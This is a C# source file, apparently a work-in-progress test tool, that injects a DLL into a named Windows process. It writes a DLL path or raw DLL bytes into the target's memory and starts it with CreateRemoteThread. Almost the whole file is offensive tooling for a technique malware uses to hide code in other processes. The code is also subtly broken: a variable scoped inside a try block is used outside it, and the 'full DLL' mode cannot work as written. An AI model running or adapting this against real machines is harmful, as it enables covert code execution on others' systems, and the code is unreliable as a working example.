using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

// Current Implementations:
//  1. CreateRemoteThread() [90%]
//      1.1 - Full Path
//      1.2 - Full DLL
//  2. Reflective DLL Injection [WIP]
//  3. SIR (Suspend, Inject, Resume) [ToDo]
//  4. NtCreateThreadEx() [Does this even still work?]


namespace ProcessInjection_Test1
{
    class InjectionTests
    {
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // used for memory allocation
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr procHandleess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandleess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        //[DllImport("kernel32")]
        //static extern IntPtr CreateFileA(string lpFileName, int dwDesiredAccess, int dwShareMode, int lpSecurityAttributes, int dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);

        //[DllImport("kernel32")]
        //static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwSize);

        //[DllImport("kernel32")]
        //static extern IntPtr GetProcessHeap();

        //[DllImport("kernel32")]
        //static extern IntPtr ReadFile(IntPtr hFile, IntPtr lpBuffer, uint dwNumberOfBytesToRead, uint lpNumberOfBytesRead, uint lpOverlapped);

        static void Main(string[] args)
        {
            // dllName is specified on CLI as: "C:\\dll.dll"
            if (args.Length < 3)
            {
                Console.WriteLine("[*] Usage: InjectionTests.exe <DLL> <TARGET_PROCESS> <TYPE>");
                Console.WriteLine("[*] e.g.   InjectionTests.exe \"C:\\\\inject.dll\" notepad crt");
            }

            string dllName = args[0];
            string processName = args[1];
            string type = args[2];            
            Console.WriteLine("[!] Process Injection Tests");

            if (args[2] == "crt")
            {
                Console.WriteLine("[!] Injecting with CreateRemoteThread()");
                Console.WriteLine("[+] Full DLL [1] or DLL Path [2]?");
                string path = Console.ReadLine();
               
                if (path == "1")
                {
                    Console.WriteLine("[!] Injecting Full DLL ");
                    crt_Injection(processName, dllName, false);
                }
                if (path == "2")
                {
                    Console.WriteLine("[!] Injecting DLL Path");
                    crt_Injection(processName, dllName, true);
                }
            }            
            return;
        }

        static void crt_Injection(string processName, string dllName, bool path)
        {          

            // Get a handle to the target process 
            // This is the process we're injecting INTO
            Console.WriteLine("[+] Attempting to find " + processName);
            try
            {
                Process proc = Process.GetProcessesByName(processName)[0];
            }
            catch (Exception)
            {

                throw;
            }
            
            Console.WriteLine("[+] Got Process: " + proc.Id);
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Console.WriteLine("[+] Got Process Handle: " + procHandle.ToInt64());



            // Pretty much everything stays the same between injecting the full DLL and the DLL's path, but we need to separate some of the big stuff here
            // The largest different is that we don't use LoadLibraryA() when we inject the full DLL
            // VirtualAllocEx also differs, as we're allocating different amounts of memory
            if (path)
            {
                // Load the address of the LoadLibraryA function
                // We'll need this in order to actually LOAD our allocated memory when we call CRT
                IntPtr loadLibrary_Address = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                Console.WriteLine("[+] Got LoadLibraryA Address: " + loadLibrary_Address.ToInt64());

                // Now, we allocate some memory within the target process that we'll use for writing
                IntPtr virtualAllocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                Console.WriteLine("[+] Allocated Memory: " + virtualAllocMemAddress.ToString());

                // Here we write the path to the DLL we're injecting into the memory of the target process, using the address we saved when calling VirtualAllocEx
                UIntPtr bytesWritten;
                byte[] bdll = System.Text.Encoding.Default.GetBytes(dllName);
                bool res = WriteProcessMemory(procHandle, virtualAllocMemAddress, bdll, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
                if (res == true)
                {
                    Console.WriteLine("[+] Process memory written, wrote " + bytesWritten.ToString() + " bytes");
                    // Finally, we can run CRT with the handle of the target process, the address of LoadLibraryA and the address of the allocated memory
                    Console.WriteLine("[!] Prerequisites satisfied, attempting to CreateRemoteThread...");
                    var threadId = CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibrary_Address, virtualAllocMemAddress, 0, IntPtr.Zero);
                    Console.WriteLine("[+] Created threadId: " + threadId.ToString());
                }
            }
            if (!path)
            {
                // First, we need to acquire the file size for allocation
                byte[] dllBytes = File.ReadAllBytes(dllName);
                Console.WriteLine("[+] Read " + dllBytes.Length + " bytes from target DLL");

                // Now, we allocate some memory within the target process that we'll use for writing
                IntPtr virtualAllocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)dllBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                Console.WriteLine("[+] Allocated Memory: " + virtualAllocMemAddress.ToString());

                // Once memory is allocated, we pass WriteProcessMemory the address and bytes to write
                UIntPtr bytesWritten;
                bool res = WriteProcessMemory(procHandle, virtualAllocMemAddress, dllBytes, (uint)dllBytes.Length, out bytesWritten);
                if (res == true)
                {
                    Console.WriteLine("[+] Process memory written, wrote " + bytesWritten.ToString() + " bytes, attempting to CreateRemoteThread...");
                    var threadId = CreateRemoteThread(procHandle, IntPtr.Zero, 0, virtualAllocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
                    Console.WriteLine("[+] Created threadId: " + threadId.ToString());
                }
            }

            return;
        }
    }
}
